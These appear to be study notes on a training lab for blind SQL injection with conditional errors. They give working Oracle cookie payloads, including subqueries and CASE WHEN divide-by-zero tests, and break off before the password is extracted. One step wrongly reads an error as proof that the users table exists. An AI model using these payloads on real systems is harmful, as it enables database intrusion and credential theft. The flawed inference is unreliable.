# Blind SQL injection with conditional errors
- Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database
- The possibilities depend largely on the configuration of the database and the types of errors you're able to trigger
- may be able to induce the application to return a specific error response based on the result of a boolean expression
- may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into "visible" ones
- it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally,
- This involves modifying the query so that it will cause a database error if the condition is true
- but not if the condition is false
- Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message)
- allowing us to infer the truth of the injected condition
# Lab
- blind SQL injection vulnerability
- uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie
- the application does not respond any differently based on whether the query returns any rows
- If the SQL query causes an error, then the application returns a custom error message
- The database contains a different table called users, with columns called username and password
# Goal 
- find Administartor password
- log in as administartor
# Solving The lab
- Visit the front page of the shop
- intercept and modify the request containing the TrackingId cookie
- Modify the TrackingId cookie, appending a single quotation mark to it
```
TrackingId=xyz'
```
- we see internal server error
- Now change it to two quotation marks and the error disappears
- to confirm that the server is interpreting the injection as a SQL query ,that the error is a SQL syntax error as opposed to any other kind of error
- first need to construct a subquery using valid SQL syntax
```
TrackingId=xyz'||(SELECT '')||'
```
- query still appears to be invalid maybe we are dealing with oracle db so we need to inserf from caluse
```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```
- query look valid and we got a 200 response
- now submitting an invalid query while still preserving valid SQL syntax
```
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```
- we got internal server error
- can use this error response to infer key information about the database. For example, in order to verify that the users table exists
```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
- WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row
- we confirmed that users table exists because we got internal server error
- now exploit this behavior to test conditions
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
- an error message is received
- Now change it
```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
